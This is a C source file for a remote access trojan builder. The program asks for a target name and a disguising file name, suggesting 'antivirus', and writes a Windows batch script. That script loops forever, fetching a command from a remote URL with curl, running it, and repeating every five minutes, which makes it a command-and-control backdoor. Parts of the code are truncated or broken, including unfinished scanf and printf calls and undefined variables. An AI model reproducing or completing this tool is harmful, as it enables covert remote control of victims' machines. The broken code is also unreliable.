#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void generate_rat(char Target[] , char file_name[]) {
	printf("Target = %s", Target);
	printf("\nCreating File: %s", file_name);
	char t[100];
	char sl[100] = "/";
	char f[100];
	strcpy(t, Target);
	strcpy(f, file_name);
	char make_dir[50] = "mkdir ";
	strcat(make_dir, Target);
	system(make_dir);
	
	// PATH BULLSHIT CONCAT
	strcat(t, sl);
	strcat(t, f);
	printf("\n%s",t);
	
	// LINKS
	char target_link[100];
	scanf("
	
	printf("
	
	FILE *fptr;
	fptr = fopen(t, "w");

fprintf(fp,
    "@echo off\n"
    "setlocal enabledelayedexpansion\n\n"

    ":loop\n"
    "curl -s \"%s\" > temp_cmd.txt\n"
    "set /p command=<temp_cmd.txt\n"
    "del temp_cmd.txt\n\n"

    "%%command%%\n\n"

    "timeout /t 300 /nobreak >nul\n"
    "goto loop\n",
    link2
);

	fclose(fptr);
	printf("RAT SCRIPT HAS BEEN CREATED SUCCESSFULLY");
	
}

void control_panel() {
	
}

void view_rats() {
	char command[15] = "ls";
	system(command);
}

int main() {
	char target_name[20];
	char file[20];
	char file_format[10] = ".bat";
	int run = 1;
	int action;
	
	printf("\n(1) CREATE NEW RAT");
	printf("\n(2) VIEW ALL RATS");
	printf("\n(0) EXIT");
	
	while (run != 0) {
		printf("\nEnter choice: ");
		scanf("%d",&action);
		
		if (action == 1) {
			printf("\nEnter target name: ");
			scanf("%s",target_name);
			printf("\nEnter file name (eg: antivirus) : ");
			scanf("%s", file);
			strcat(file, file_format);
			//printf("\n%s", file);
			generate_rat(target_name, file);
		} else if (action == 2) {
			view_rats();
		} else if (action == 0) {
			run = 0;
		} else {
			printf("\nINVALID ARGUMENT");
		}
	}
	//generate_rat("Sam", "code.bat");
	return 0;
}
